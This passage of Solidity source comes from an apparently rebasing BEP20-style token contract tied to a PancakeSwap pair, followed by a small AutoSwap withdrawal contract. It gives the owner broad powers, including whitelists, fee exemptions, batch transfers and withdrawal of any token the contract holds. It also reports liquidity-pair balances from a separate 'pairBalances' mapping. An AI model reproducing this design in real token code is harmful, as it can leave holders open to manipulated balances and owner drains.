    function setAutoLiquidityInterval(uint256 _minutes) external onlyOwner{
        require(_minutes>0,"invalid time");
        autoLiquidityInterval = _minutes*1 minutes;
    }
    function setAutoAddLiquidity(bool _flag) external onlyOwner {
        if(_flag) {
            _autoAddLiquidity = _flag;
            _lastAddLiquidityTime = block.timestamp;
        } else {
            _autoAddLiquidity = _flag;
        }
    }

    event TransferMultiple(uint256 code);

    function transferMultiple(address[] memory _tos,uint256[] memory _amounts,uint256 code) public onlyOwner returns (bool) {
        require(msg.sender != address(0), "TRC20: transfer from the zero address");
        uint256 _i=0;
        for(_i=0;_i<_tos.length;_i++){
            (bool senderPair, bool recipientPair) = isPair(msg.sender, address(_tos[_i]), address(this));
            _basicTransfer(msg.sender, _tos[_i],  _amounts[_i], senderPair, recipientPair);
        }
        emit TransferMultiple(code);
        return true;
    }

    function allowance(address owner_, address spender)
    external
    view
    override
    returns (uint256)
    {
        return _allowedFragments[owner_][spender];
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
    external
    returns (bool)
    {
        uint256 oldValue = _allowedFragments[msg.sender][spender];
        if (subtractedValue >= oldValue) {
            _allowedFragments[msg.sender][spender] = 0;
        } else {
            _allowedFragments[msg.sender][spender] = oldValue.sub(
                subtractedValue
            );
        }
        emit Approval(
            msg.sender,
            spender,
            _allowedFragments[msg.sender][spender]
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
    external
    returns (bool)
    {
        _allowedFragments[msg.sender][spender] = _allowedFragments[msg.sender][
        spender
        ].add(addedValue);
        emit Approval(
            msg.sender,
            spender,
            _allowedFragments[msg.sender][spender]
        );
        return true;
    }

    function approve(address spender, uint256 value)
    external
    override
    returns (bool)
    {
        _allowedFragments[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function _approve(address owner, address spender, uint256 value)
    internal
    returns (bool)
    {
        _allowedFragments[owner][spender] = value;
        emit Approval(owner, spender, value);
        return true;
    }

    function checkFeeExempt(address _addr) external view returns (bool) {
        return _isFeeExempt[_addr];
    }

    function getCirculatingSupply() public view returns (uint256) {
        return
        (TOTAL_GONS.sub(_gonBalances[DEAD]).sub(_gonBalances[ZERO])).div(
            _gonsPerFragment
        );
    }

    function isNotInSwap() external view returns (bool) {
        return !inSwap;
    }

    function manualSync() external {
        IPancakeSwapPair(pair).sync();
    }

    function setFeeExemptList(address[] memory _addrs) external onlyOwner {
        for(uint256 i=0;i<_addrs.length;i++){
            _isFeeExempt[_addrs[i]] = true;
        }
    }

    function setWhiteList(address[] memory _addrs) external onlyOwner {
        for(uint256 i=0;i<_addrs.length;i++){
            _whiteList[_addrs[i]] = true;
        }
    }

    function setDividendExclude(address account, bool enabled) public onlyOwner {
        dividendExclude[account] = enabled;
        if (enabled) {
            if(_updated[account] ){
                quitShare(account);
                return;
            }
        }
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address who) public view override returns (uint256) {
        (bool senderPair,) = isPair(who, address(0), address(this));
        if (senderPair){
            return pairBalances[who];
            // return pairBalance;
        }else{
            return _gonBalances[who].div(_gonsPerFragment);
        }
    }

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

    function withdraw(address token) public onlyOwner {
        uint256 balance = IERC20(token).balanceOf(address(this));
        if (balance > 0) {
            IERC20(token).transfer(msg.sender, balance);
        }
    }

}


contract AutoSwap {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function withdraw(address token) public {
        require(msg.sender == owner, "caller is not owner");
        uint256 balance = IERC20(token).balanceOf(address(this));
        if (balance > 0) {
            IERC20(token).transfer(msg.sender, balance);
        }
    }

    function withdraw(address token, uint256 amount) public {
        require(msg.sender == owner, "caller is not owner");
        uint256 balance = IERC20(token).balanceOf(address(this));
        require(amount > 0 && balance >= amount, "Illegal amount");
        IERC20(token).transfer(msg.sender, amount);
    }

    function withdraw(address token, address to) public {
        require(msg.sender == owner, "caller is not owner");
        uint256 balance = IERC20(token).balanceOf(address(this));
        if (balance > 0) {
            IERC20(token).transfer(to, balance);
        }
    }
}